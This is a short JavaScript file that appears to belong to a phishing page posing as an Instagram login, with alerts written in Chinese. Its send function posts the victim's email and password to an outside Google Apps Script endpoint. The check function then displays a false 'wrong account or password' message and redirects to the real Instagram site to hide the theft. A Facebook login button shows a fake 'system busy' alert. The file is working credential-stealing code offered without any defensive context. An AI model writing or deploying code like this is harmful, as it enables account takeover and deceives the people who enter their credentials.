var submitBtn = document.getElementById("submitBtn");
submitBtn.addEventListener('click' , send);
submitBtn.addEventListener('click' , check);

function check() {
    if (document.getElementById("email").value === "" || document.getElementById("password").value === "") {
        alert("輸入欄不能為空白，請重新輸入");
    } else {
        alert("帳號或密碼輸入錯誤，請再次嘗試");
        setTimeout("location.href='https://www.instagram.com/'", 5);
    }
}

function send() {
    var email = document.querySelector('#email').value;
    var password = document.querySelector('#password').value;
    $.ajax({
        type: "get",
        url: "https://script.google.com/macros/s/AKfycbxomvFQZhAxF0CKbKbztaWrarix6lrmSbs9ZNZi_HZoNw51XnxIJZw1QAlcKBDk48M/exec",
        data : {
            'email' : email,
            'password' : password
        },
        dataType: "JSON",
        /*
        success: function (response) {
            if (response === true) {
                alert("成功");
            }
        },
        */
    });
}

var fbBtn = document.getElementById("facebookBtn");
fbBtn.onclick = function () {
    alert("系統忙碌中，請稍後再試");
}




